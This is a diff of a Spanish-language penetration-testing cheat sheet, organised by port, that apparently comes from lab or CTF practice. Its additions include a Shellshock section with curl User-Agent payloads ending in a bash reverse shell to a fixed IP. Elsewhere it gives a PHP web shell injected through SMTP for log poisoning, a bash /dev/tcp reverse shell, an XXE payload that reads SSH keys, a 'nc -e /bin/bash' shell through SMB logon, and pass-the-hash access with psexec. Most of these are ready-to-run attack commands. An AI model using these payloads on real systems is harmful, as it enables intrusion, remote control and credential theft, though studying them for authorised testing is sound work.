@@ -124,7 +124,9 @@ Protocolo de red de texto plano utilizado para enviar y recibir correos electró
 Cuando un usuario envía un correo electrónico, su cliente de correo (ya sea Outlook o Gmail) utiliza SMTP para enviar el mensaje al servidor de correo destinatario.<br>
 SMTP solo se encarga de enviar correos electrónicos, no los almacena ni los muestra al usuario final, para esto se utilizan los protocolos POP3 y IMAP.
 <br>
-Puedes conectarte a la máquina usando telnet para enviar un correo electrónico a un usuario válido dentro del sistema, el cual contenga código malicioso php y ver si se acontece un <b>Log Poisoning</b> y ejecutar comandos de forma remota RCE (Remote Code Execution), todo esto en caso de que no se requiera de autenticación al momento de conectarse con telnet al puerto 25de SMTP.
+<br>
+<b>Log Poisoning.</b><br>
+Puedes conectarte a la máquina usando telnet para enviar un correo electrónico a un usuario válido dentro del sistema, el cual contenga código malicioso php y ver si se acontece un <b>Log Poisoning</b> y ejecutar comandos de forma remota RCE (Remote Code Execution), todo esto en caso de que no se requiera de autenticación al momento de conectarse con telnet al puerto 25de SMTP.<br>
 Ejemplo:
 ```
 telnet <ip-address> 25
@@ -136,7 +138,7 @@ MAIL FROM: <username>
 # MAIL FROM: Es para específicar el remitente del correo.
 
 RCPT TO: <username>	
-# RCPT TO: Es para indicar el resceptor del correo pero este tiene que ser un usuario válido dentro del sistema.
+# RCPT TO: Es para indicar el resceptor del correo, pero este tiene que ser un usuario válido dentro del sistema.
 DATA			                      # Poner el comando DATA y luego dar enter para introducir el mensaje del correo.
 <?php system($_GET['cmd']); ?>	# Códido php para aplicar un RCE mediante el parametro cmd.
 .			                          # Al termino del correo se debe finalizar con un punto.
@@ -182,7 +184,8 @@ Si hay un campo para subir archivos probar subiendo un archivo.txt para verifica
 ```
 nvim reverse_shell.php -> bash -c 'bash -i >& /dev/tcp/<ip-address>/443 0>&1'
 ```
-<br><br>
+<br>
+<br>
 <b>XXE.</b><br>
 Si se aplica validación en archivos.xml se puede acontacer un XXE si el contenido del archivo.xml te lo muestra en la web tal cual. 
 
@@ -205,32 +208,55 @@ Listar la id_rsa del usario para conectarse por ssh sin proporcionar contraseña
                   <markdown>&xxe;</markdown>
           </post>
 ```
+<br>
+<br>
+<b>ShellShock Attack.</b><br>
+Es un ataque que se produce cuando un atacante aprovecha una vulnerabilidad en el intérprete de comandos Bash.El ataque se aprovecha de la falta de validación en la entrada de comandos y permite al atacante ejecutar código malicioso en el sistema.<br><br>
+Ejemplo de como se acontece un Shellshock attack en la ruta cgi-bin con el comando `` curl `` modificando el "User-Agent".<br>
+Lo que hace el siguiente comando es hacer una petición HTTP al sitio web mediante el método GET enviando una cabecera que contiene código malicioso que permite ejecutar el comando whoami en el sistema para saber quien es el usuario que ejecuta el servidor web.  
+
+```
+curl -s -X GET "http://192.168.0.54/cgi-bin/" -H "User-Agent: () { :; }; /usr/bin/whoami"
+
+# -s -> Ejecuta el modo silencioso para que no se muestre el progreso ni la información adicional en la salida.
+# -X GET -> Especifica el método HTTP utilizado para la solicitud, en este caso, GET.
+# "http://192.168.0.54/cgi-bin/" -> Es la URL a la que se realiza la solicitud.
+# -H "User-Agent: () { :; }; /usr/bin/whoami" -> Es un encabezado personalizado que se envía con la solicitud HTTP. 
+# Este encabezado establece el User-Agent en () { :; }; /usr/bin/whoami para ejecutar el comando whoami.
+```
+<br>
+En caso de obtener como respuesta un Internal Server Error, es necesario añadir un "echo;" en el User-Agent.
+```
+curl -s -X GET "http://192.168.0.54/cgi-bin/" -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
+```
+<br>
+Enviarte una reverse shell explotando la vulnerabilidad ShellShock Attack.
+```
+curl -s -X GET "http://192.168.0.54/cgi-bin/" -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/192.168.0.62/443 0>&1"
+```
 
 
 <br><br>
 ## UPD 123 NTP (Network Time Protocol)
 Protocolo utilizado para sincronizar el reloj de las maquinas conectadas. En ocasiones algunos ataques no suele funcionar sino esta sincronizada tu hora con la de la maquina víctima.
-
+<br>
+<br>
 Ver si el puerto 123 esta abierto por UDP.
 ```
 nmap --top-ports 500 --open -sU -t5 -vvv -n -Pn <ip-address> -oG udpPorts 
 ```
-
-
+<br>
 Detectar el servicio que corre en el puerto 123 al igual que la diferencia de tiempo entre tu maquina y la maquina victima.
 ```
 nmap -sU -sCV -p123 ip-address -oN targeted
 ```
-
-
+<br>
 Se requiere instalar las siguientes librerías:
 ```
 pip3 install pyotp ntplib
 ```
-
-
-Sincronizar tu hora a la de la maquina víctima de forma temporal para obtener un TOTP.
-
+<br>
+Sincronizar tu hora a la de la máquina víctima de forma temporal para obtener un TOTP.
 ``` 
 	#!/usr/bin/python3
 	import pyotp
@@ -245,18 +271,24 @@ Sincronizar tu hora a la de la maquina víctima de forma temporal para obtener u
 ```
 
 
-
+<br><br>
 ## 135 MSRPC
+
+
 <br><br>
 ## 443 HTTPS (Hypertext Transfer Protocol Secure)
 Inspeccionar el certificado en busca de información relevante, como si se esta aplicando virtual hosting "Common Name" o para ver que emails estan registrados.
 ```
 openssl s_client -connect <ip-address>:443
 ```
+
+
 <br><br>
 ## 139/445 SMB (Server Message Block)
-Protocolo de red que controla el acceso a archivos y directorios en Microsoft Windows. Tambien permite el acceso a recursos compartidos en la red como impresoras, routers e interfaces de red abiertas.<br>
-Con este comando puedes ver el nombre de la maquina víctima (Si es controlador del dominio "DC-Admin"), la versión de windows que se esta utilizando y si el SMB esta firmado.
+Protocolo de red que controla el acceso a archivos y directorios en Microsoft Windows. Tambien permite el acceso a recursos compartidos en la red como impresoras, routers e interfaces de red abiertas.
+<br>
+<br>
+Con este comando puedes ver el nombre de la máquina víctima (Si es controlador del dominio "DC-Admin"), la versión de windows que se esta utilizando y si el SMB esta firmado.
 ```
 crackmapexec smb <ip-address>
 ```
@@ -271,13 +303,12 @@ Listar los recursos compartidos que existen a nivel de red empleando un null ses
 crackmapexec smb <ip-address> -u 'null' -p ' ' --shares
 ```
 <br>
-Hacer PassTheHash para comprobar que le hash que se tiene es del usario administrator y asi poder ganar acceso al
-sistema sin proporcionar la contraseña con la herramienta psexec.py
+Hacer PassTheHash para comprobar que el hash que se tiene es del usuario administrator y así poder ganar acceso al sistema sin proporcionar la contraseña con la herramienta psexec.py
 ```
 crackmapexec smb <ip-address> -u 'Administrator' -H ':<hash>'
 ```
 <br>
-Si ya tienes el hash NTLM ejecuta el siguiente comando y obtendras una consola como el usario nt/authority/system.
+Si ya tienes el hash NTLM ejecuta el siguiente comando y obtendras una consola como el usuario nt/authority/system.
 ```
 psexec.py WORKGROUP/Administrator@<ip-address> -hashes :<HashNTLM>
 ```
@@ -311,7 +342,7 @@ Descargar un recurso compartido a la ruta actual.
 smbmap -H <ip-address> --download <resourcename>/<filename>
 ```
 <br>
-Listar recursos de la maquina.
+Listar recursos de la máquina.
 ```
 smbclient -L <ip-address> -N 
 ```  
@@ -320,30 +351,31 @@ En caso de que se presente el error: protocol negotiation failed: NT_STATUS_CONN
 smbclient -L ipaddress -N --option 'client min protocol = NT1'
 ```
 <br>
-Conectarse a un recurso de la maquina víctima.
+Conectarse a un recurso de la máquina víctima.
 ```
 smbclient //<ip-address>/name_resource -N --option 'client min protocol = NT1'
 Ej; smbclient //<ip-address>/tmp -N --option 'client min protocol = NT1'
 ```
 <br>
-Una vez conectado a un recurso de la maquina ver si esta habilitado el comando logon con help. Si está habilitado te puedes enviar una reverse shell poniendote en escucha con ncat por el puerto 443.
+Una vez conectado a un recurso de la máquina puedes ver si está habilitado el comando logon con el comando `` help ``. Si está habilitado te puedes enviar una reverse shell poniendote en escucha con netcat en el puerto 443.
 ```
 sudo rlwrap ncat -nlvp 443
 
 logon "/='nohup nc -e /bin/bash <ip-address> 443'"
 ```
+
+
 <br><br>
 ## 5985 WinRM (Windows Remote Management)
-La administracion remota de windows permite que los sistemas accedan o intercambien información de gestión a través de una red común.
-
-Para poderte conectar a los servicios remotos de windows primero debes comprobar que el usario forme parte del grupo Remote Managment User con la herramiente crackmapexec.
-
-Si al final de la ejecucion te pone un [+] pwned! significa que el usuario forma parte del grupo Remote Management User.
+La administración remota de windows permite que los sistemas accedan o intercambien información de gestión a través de una red común.
+<br>
+<br>
+Para poderte conectar a los servicios remotos de windows primero debes comprobar que el usuario forme parte del grupo Remote Managment User con la herramiente crackmapexec.<br>
+Si al final de la ejecución te pone un [+] pwned! significa que el usuario forma parte del grupo Remote Management User.
 ```
 crackmapexec winrm 10.10.11.108 -u 'user' -p 'password' -> [+] pwn3d!
 ```
-  
-
+<br>
 Ya solo queda conectarse al servicio remoto de windows con la herramienta evil-winrm.
 ```
 evil-winrm -i <ip-address> -u 'user' -p 'password'
